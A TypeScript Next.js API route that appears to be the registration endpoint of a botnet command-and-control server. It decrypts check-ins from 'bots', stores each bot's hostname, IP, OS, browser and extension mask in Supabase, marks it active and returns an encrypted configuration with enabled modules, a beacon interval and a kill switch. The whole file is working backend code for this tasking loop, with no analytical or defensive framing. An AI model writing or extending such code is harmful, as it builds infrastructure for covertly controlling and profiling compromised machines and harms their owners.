import { createClient } from "@supabase/supabase-js";
import { NextRequest, NextResponse } from "next/server";
import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";

function getSupabase() {
    return createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    );
}

export async function POST(request: NextRequest) {
    try {
        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
        if (!botPubKeyB64) {
            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
        }

        const sessionKey = await deriveSessionKey(botPubKeyB64);

        const encData = await request.json();
        if (!encData || !encData.iv || !encData.ciphertext) {
            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
        }

        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
        const { bot_id, hostname, user_agent, os, browser, extension_mask } = body;

        if (!bot_id) {
            return NextResponse.json({ error: "bot_id required" }, { status: 400 });
        }

        const supabase = getSupabase();
        const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
            || request.headers.get("x-real-ip")
            || "unknown";

        const { error: botError } = await supabase.from("bots").upsert(
            {
                bot_id,
                hostname: hostname || null,
                ip_address: ip,
                user_agent: user_agent || null,
                os: os || null,
                browser: browser || null,
                extension_mask: extension_mask || "Unknown",
                status: "active",
                last_seen_at: new Date().toISOString(),
            },
            { onConflict: "bot_id" }
        );

        if (botError) {
            console.error("Bot upsert error:", botError);
            return NextResponse.json({ error: "registration failed" }, { status: 500 });
        }

        const { data: existingConfig } = await supabase
            .from("bot_configs")
            .select("*")
            .eq("bot_id", bot_id)
            .single();

        if (!existingConfig) {
            await supabase.from("bot_configs").insert({
                bot_id,
                modules_enabled: [],
                beacon_interval_sec: 300,
                kill_switch: false,
            });
        }

        const { data: config } = await supabase
            .from("bot_configs")
            .select("*")
            .eq("bot_id", bot_id)
            .single();

        const responseObj = {
            status: "registered",
            config: config || { modules_enabled: [], beacon_interval_sec: 300, kill_switch: false },
        };

        const encResponse = await encryptPayload(sessionKey, responseObj);
        return NextResponse.json(encResponse);
    } catch (e) {
        console.error("Register error:", e);
        return NextResponse.json({ error: "internal error" }, { status: 500 });
    }
}
